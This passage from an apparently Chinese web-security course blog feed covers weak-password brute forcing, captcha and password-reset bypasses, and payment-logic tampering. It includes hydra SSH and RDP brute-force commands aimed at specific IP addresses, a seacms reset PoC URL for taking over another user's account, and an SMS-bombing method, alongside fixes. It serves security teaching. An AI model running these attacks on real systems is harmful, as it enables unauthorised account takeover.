src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154407125.png" alt="image-20230309154407125"></p><p>在验证码的payload设置时</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154622756.png" alt="image-20230309154622756"></p><p>使用插件</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154655038.png" alt="image-20230309154655038"></p><p>随后右击验证码图片复制其地址</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154802351.png" alt="image-20230309154802351"></p><p>在intruder数据包里添加xiapao:验证码图片链接</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154928377.png" alt="image-20230309154928377"></p><p>点开始</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309155240511.png" alt="image-20230309155240511"></p><h4 id="服务类-SSH-amp-RDP远程终端猜解"><a href="#服务类-SSH-amp-RDP远程终端猜解" class="headerlink" title="#服务类-SSH&amp;RDP远程终端猜解"></a>#服务类-SSH&amp;RDP远程终端猜解</h4><p><a href="https://github.com/vanhauser-thc/thc-hydra%EF%BC%88%E4%B9%9D%E5%A4%B4%E8%9B%87%EF%BC%89">https://github.com/vanhauser-thc/thc-hydra（九头蛇）</a></p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p><p>-s PORT 可通过这个参数指定非默认端口。</p><p>-l LOGIN 指定破解的用户，对特定用户破解。</p><p>-L FILE 指定用户名字典。</p><p>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</p><p>-P FILE 大写，指定密码字典。</p><p>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</p><p>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L&#x2F;-P参数。</p><p>-M FILE 指定目标列表文件一行一条。</p><p>-o FILE 指定结果输出文件。</p><p>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</p><p>-t TASKS 同时运行的线程数，默认为16。</p><p>-w TIME 设置最大超时的时间，单位秒，默认是30s。</p><p>-v &#x2F; -V 显示详细过程。</p><p>server 目标ip</p><p>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</p><p>shell7连接本地的kali，将脚本置于kali上（事先探针远程端口以判断用什么协议）</p><h6 id="爆破linux"><a href="#爆破linux" class="headerlink" title="爆破linux:"></a>爆破linux:</h6><p>hydra -l root -P UserPassCombo-Jay.txt -t 5 -vV 47.110.73.12 ssh -f</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160107079.png" alt="image-20230309160107079"></p><p>爆破出来后用shell7连接即可</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160148030.png" alt="image-20230309160148030"></p><h6 id="爆破windows"><a href="#爆破windows" class="headerlink" title="爆破windows:"></a>爆破windows:</h6><p>hydra -l administrator -P UserPassCombo-Jay.txt -t 5 -vV 47.99.218.105 rdp -f</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160319881.png" alt="image-20230309160319881"></p><p>爆破后输入cmd命令mstsc连接即可</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160426565.png" alt="image-20230309160426565"></p><h4 id="应用类-ZIP-amp-WORD文件压缩包猜解"><a href="#应用类-ZIP-amp-WORD文件压缩包猜解" class="headerlink" title="#应用类-ZIP&amp;WORD文件压缩包猜解"></a>#应用类-ZIP&amp;WORD文件压缩包猜解</h4><p>PassFab for Word</p><p>Advanced Archive Password Recovery </p><h4 id="字典类-密文收集-amp-弱口令-amp-自定义生成"><a href="#字典类-密文收集-amp-弱口令-amp-自定义生成" class="headerlink" title="#字典类-密文收集&amp;弱口令&amp;自定义生成"></a>#字典类-密文收集&amp;弱口令&amp;自定义生成</h4><p><a href="https://monitor.firefox.com/">https://monitor.firefox.com</a> 国外</p><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a> 国外</p><p><a href="https://www.bugku.com/mima">https://www.bugku.com/mima</a></p><p><a href="https://reg007.com/">https://reg007.com</a>  查询邮箱绑定过的网站</p><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a> 收集近年一些平台使用习惯最多的弱口令</p><p><a href="https://github.com/hetianlab/DefaultCreds-cheat-sheet">https://github.com/hetianlab/DefaultCreds-cheat-sheet</a> 常见平台初始化的弱口令（excle文件）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、弱口令安全&amp;amp;配置&amp;amp;初始化等&lt;/p&gt;
&lt;p&gt;2、弱口令对象&amp;amp;Web&amp;amp;服务&amp;amp;应用</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day51 WEB攻防-通用漏洞&amp;验证码识别&amp;复用&amp;调用&amp;找回密码重定向&amp;状态值</title>
    <link href="http://example.com/2023/03/08/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/"/>
    <id>http://example.com/2023/03/08/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/</id>
    <published>2023-03-08T15:27:33.000Z</published>
    <updated>2023-03-09T09:25:00.361Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、找回密码逻辑机制-回显&amp;验证码&amp;指向</p><p>2、验证码验证安全机制-爆破&amp;复用&amp;识别</p><p>3、找回密码-客户端回显&amp;Response状态值&amp;修改重定向</p><p>4、验证码技术-验证码爆破，验证码复用，验证码识别等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="找回密码流程安全："><a href="#找回密码流程安全：" class="headerlink" title="找回密码流程安全："></a>找回密码流程安全：</h4><p>1、用回显状态判断-res前端判断不安全</p><p>2、用用户名重定向-修改标示绕过验证</p><p>3、验证码回显显示-验证码泄漏验证虚设</p><p>4、验证码简单机制-验证码过于简单爆破</p><h4 id="验证码绕过安全："><a href="#验证码绕过安全：" class="headerlink" title="验证码绕过安全："></a>验证码绕过安全：</h4><p>1、验证码简单机制-验证码过于简单爆破</p><p>2、验证码重复使用-验证码验证机制绕过</p><p>3、验证码智能识别-验证码图形码被识别</p><p>4、验证码接口调用-验证码触发机制枚举</p><h3 id="安全修复方案："><a href="#安全修复方案：" class="headerlink" title="#安全修复方案："></a>#安全修复方案：</h3><p>找回机制要进行每一步验证-防绕过重定向</p><p>找回机制要进行服务端验证-防res数据修改</p><p>找回机制要控制验证码安全-防验证码攻击</p><p>验证码接口需验证后被调用-防接口被乱调用</p><p>验证码引用智能化人工判断-防验证码被识别</p><p>验证码采用时间段生效失效-防验证码被复用</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ phpun-res值修改&amp;验证码回显&amp;爆破</p><p>➢ 某APP-res值修改&amp;验证码接口调用&amp;复用</p><p>➢ seacms-验证码识别&amp;找回机制对应值修改</p><h4 id="phpun-res值修改-amp-验证码回显-amp-爆破"><a href="#phpun-res值修改-amp-验证码回显-amp-爆破" class="headerlink" title="#phpun-res值修改&amp;验证码回显&amp;爆破"></a>#phpun-res值修改&amp;验证码回显&amp;爆破</h4><h4 id="1、res修改-绑定手机号时修改返回状态值判定通过"><a href="#1、res修改-绑定手机号时修改返回状态值判定通过" class="headerlink" title="1、res修改-绑定手机号时修改返回状态值判定通过"></a>1、res修改-绑定手机号时修改返回状态值判定通过</h4><p>绑定手机号，假设验证码不知道，随便先输入一个，点击响应数据包</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309132011889.png" alt="image-20230309132011889"></p><p>验证码错误回显为3</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309132109034.png" alt="image-20230309132109034"></p><p>当验证码正确时，此处返回为1，那么可以在输入错误的验证码后修改响应数据包的返回值为1，即可绑定成功（具体会不会成功要看它是否是前端验证，所以提示成功也不一定成功，可能是后端验证）</p><h5 id="2、验证码回显-绑定手机号时验证码前端泄漏被获取"><a href="#2、验证码回显-绑定手机号时验证码前端泄漏被获取" class="headerlink" title="2、验证码回显-绑定手机号时验证码前端泄漏被获取"></a>2、验证码回显-绑定手机号时验证码前端泄漏被获取</h5><p>同样此处绑定手机号，假设验证码不知道，随便先输入一个</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309131557198.png" alt="image-20230309131557198"></p><p>保存抓包，发现验证码在cookie显示了，改成cookie里面的值后绑定成功</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309131655808.png" alt="image-20230309131655808"></p><h4 id="3、验证码爆破-知道验证码规矩进行无次数限制爆破"><a href="#3、验证码爆破-知道验证码规矩进行无次数限制爆破" class="headerlink" title="3、验证码爆破-知道验证码规矩进行无次数限制爆破"></a>3、验证码爆破-知道验证码规矩进行无次数限制爆破</h4><p>由此处可以知道验证码是6位的，如果说对输入验证的次数没有要求的话（即不会改变验证码），就可以用burp的intruder模块爆破</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309132710837.png" alt="image-20230309132710837"></p><p>搜索哪个返回值里面是1</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133057982.png" alt="image-20230309133057982"></p><h4 id="某APP-res值修改-amp-验证码接口调用-amp-复用"><a href="#某APP-res值修改-amp-验证码接口调用-amp-复用" class="headerlink" title="#某APP-res值修改&amp;验证码接口调用&amp;复用"></a>#某APP-res值修改&amp;验证码接口调用&amp;复用</h4><h4 id="1、res修改-找回密码修改返回状态值判定验证通过"><a href="#1、res修改-找回密码修改返回状态值判定验证通过" class="headerlink" title="1、res修改-找回密码修改返回状态值判定验证通过"></a>1、res修改-找回密码修改返回状态值判定验证通过</h4><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133453848.png" alt="image-20230309133453848"></p><p>随便输入错误的验证码</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133628521.png" alt="image-20230309133628521"></p><p>点击返回数据包</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133727892.png" alt="image-20230309133727892"></p><p>将此处的错误回显改为验证码正确的回显</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309134833288.png" alt="image-20230309134833288"></p><p>发现可以重置密码了</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309134916415.png" alt="image-20230309134916415"></p><h4 id="2、验证码接口调用-抓当前发送验证码数据包后调用"><a href="#2、验证码接口调用-抓当前发送验证码数据包后调用" class="headerlink" title="2、验证码接口调用-抓当前发送验证码数据包后调用"></a>2、验证码接口调用-抓当前发送验证码数据包后调用</h4><p>输入号码后直接点获取手机验证码行不通，因为要先输入验证码</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309135252411.png" alt="image-20230309135252411"></p><p>但是此处，因为验证码可以复用，所以点击获取手机验证码抓包，可以不断更改手机号码造成短信轰炸，正常安全的，每点击一次获取手机验证码都会刷新一次验证码，从而继续执行先输入图片验证码再获取短信验证码的逻辑</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309135420075.png" alt="image-20230309135420075"></p><p>正确的措施：</p><p>获取：</p><p>每一分钟才能触发一次发送验证码 防止乱用</p><p>图像验证码是否正确 防止是机器，确保是人工</p><h4 id="3、验证码复用-抓第一次验证通过的验证码进行复用"><a href="#3、验证码复用-抓第一次验证通过的验证码进行复用" class="headerlink" title="3、验证码复用-抓第一次验证通过的验证码进行复用"></a>3、验证码复用-抓第一次验证通过的验证码进行复用</h4><p>存在复用：第一次用那个验证码发包后抓取，后面继续发送这个数据包依然可行，没有提示需要填写新的验证码</p><p>不存在复用：发一次数据包就更换了当前的验证码</p><h3 id="seacms-验证码识别-amp-找回机制对应值修改"><a href="#seacms-验证码识别-amp-找回机制对应值修改" class="headerlink" title="#seacms-验证码识别&amp;找回机制对应值修改"></a>#seacms-验证码识别&amp;找回机制对应值修改</h3><h4 id="找回机制对应值修改："><a href="#找回机制对应值修改：" class="headerlink" title="找回机制对应值修改："></a>找回机制对应值修改：</h4><p>注册两个帐号（xiaosedi1 &amp;&amp; xiaosedi2），尝试找回(xiaosedi1)密码，重置连接重定向绕过</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309142308759.png" alt="image-20230309142308759"></p><p>跳转到此界面</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309142453809.png" alt="image-20230309142453809"></p><p>复制链接到另一处，尝试更改repswname&#x3D;xiaosedi2，发现失败</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309142651447.png" alt="image-20230309142651447"></p><p>代码审计后分析Poc：</p><p>member.php?mod&#x3D;repsw3&amp;repswcode&#x3D;y&amp;repswname&#x3D;targetUser</p><p>系统默认新用户的repswname&#x3D;y改过密码后才会更改为字符串</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309143533271.png" alt="image-20230309143533271"></p><h4 id="验证码识别：xp-CAPTCHA"><a href="#验证码识别：xp-CAPTCHA" class="headerlink" title="验证码识别：xp_CAPTCHA"></a>验证码识别：xp_CAPTCHA</h4><p><a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p><p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p><p>使用环境：windows 10 python3.6.5</p><p>安装使用：具体看直播操作</p><p>1、burp安装jypython后导入py文件</p><p>2、安装所需库后python运行server.py</p><p>3、抓操作数据包后设置参数设置引用</p><p>参考案例：<a href="https://www.cnblogs.com/punished/p/14746970.html">https://www.cnblogs.com/punished/p/14746970.html</a></p><p>应用：爆破密码时，接口调用时，测试其他时等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、找回密码逻辑机制-回显&amp;amp;验证码&amp;amp;指向&lt;/p&gt;
&lt;p&gt;2、验证码验证安全机制-爆破&amp;amp;复用&amp;am</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day50 WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换</title>
    <link href="http://example.com/2023/02/24/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/"/>
    <id>http://example.com/2023/02/24/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/</id>
    <published>2023-02-24T05:24:52.000Z</published>
    <updated>2023-03-08T14:02:13.996Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、商品购买-数量&amp;价格&amp;编号等</p><p>2、支付模式-状态&amp;接口&amp;负数等</p><p>3、折扣处理-优惠券&amp;积分&amp;重放等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>1、熟悉常见支付流程</p><p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p><p>2、熟悉那些数据篡改</p><p>商品编号ID，购买价格，购买数量，支付方式，订单号，支付状态等</p><p>3、熟悉那些修改方式</p><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>1、权限相关-越权&amp;访问控制&amp;未授权访问等</p><p>2、购买支付-数据篡改&amp;支付模式&amp;其他折扣等</p><p>3、下节课</p><p>4、下节课</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 数据篡改-价格&amp;数量&amp;产品</p><p>➢ 修改方式-订单号&amp;数量&amp;优惠券</p><p>➢ 某实例-演示站交易支付逻辑安全</p><p>➢ 代码审计-业务支付逻辑&amp;安全修复</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h5 id="数据篡改-价格-amp-数量-amp-产品"><a href="#数据篡改-价格-amp-数量-amp-产品" class="headerlink" title="#数据篡改-价格&amp;数量&amp;产品"></a>#数据篡改-价格&amp;数量&amp;产品</h5><p>1、修改数量达到价格变动</p><p>2、修改单价达到价格变动</p><p>3、修改产品达到低价购买</p><p>4、修改接口达到成功购买</p><p>靶场：大米cms</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70.png" 